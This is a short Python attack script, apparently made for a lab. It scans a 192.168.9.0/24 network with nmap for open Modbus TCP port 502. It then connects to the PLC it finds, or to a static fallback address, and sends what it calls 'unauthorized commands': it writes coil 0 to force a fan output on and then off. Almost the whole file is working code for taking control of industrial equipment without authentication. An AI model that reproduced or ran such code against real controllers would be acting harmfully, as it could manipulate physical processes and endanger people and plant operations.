import socket
from pymodbus.client.sync import ModbusTcpClient
from pymodbus.payload import BinaryPayloadBuilder
from pymodbus.constants import Endian
from pymodbus.exceptions import ModbusIOException
import nmap

def find_plc_ip():
    """Discovers a live PLC by scanning for open Modbus TCP (port 502) on the network."""
    nm = nmap.PortScanner()
    print("Scanning network for live PLC devices...")
    nm.scan(hosts="192.168.9.0/24", arguments="-p 502 --open")
    for host in nm.all_hosts():
        if 'tcp' in nm[host] and nm[host]['tcp'][502]['state'] == 'open':
            print(f"Discovered PLC with Modbus TCP open at: {host}")
            return host
    print("No PLC with Modbus TCP found on the network.")
    return None

def send_unauthorized_command(ip_address):
    """Connects to the PLC and sends unauthorized commands."""
    client = ModbusTcpClient(ip_address)
    
    if not client.connect():
        print(f"Failed to connect to PLC at {ip_address}")
        return
    
    print(f"Connected to PLC at {ip_address}. Sending unauthorized commands...")

    try:
        # Force the fan output Q_FAN (%Q0.0) ON
        write_address = 0   # %Q0.0 corresponds to coil address 0 in Modbus
        result = client.write_coil(write_address, True)
        
        if isinstance(result, ModbusIOException):
            print("Failed to write unauthorized command.")
        else:
            print("Unauthorized command to activate the fan was successfully sent.")
        
        # Optionally, toggle the fan off after a few seconds (or perform other actions)
        
        # Force the fan output Q_FAN (%Q0.0) OFF
        import time
        time.sleep(5) # Wait 5 seconds before turning it off
        result = client.write_coil(write_address, False)
        
        if isinstance(result, ModbusIOException):
            print("Failed to write unauthorized command.")
        else:
            print("Unauthorized command to deactivate the fan was successfully sent.")

    except Exception as e:
        print(f"An error occurred: {str(e)}")
    finally:
        client.close()
        print("Disconnected from PLC.")

if __name__ == "__main__":
    # Attempt to discover the PLC IP if not known
    plc_ip = find_plc_ip()
    
    if not plc_ip:
        # Use the static IP for this setup as a fallback
        print("Using static IP address for PLC: 192.168.9.24")
        plc_ip = "192.168.9.24"
    
    # Send unauthorized commands to the discovered or static IP
    send_unauthorized_command(plc_ip)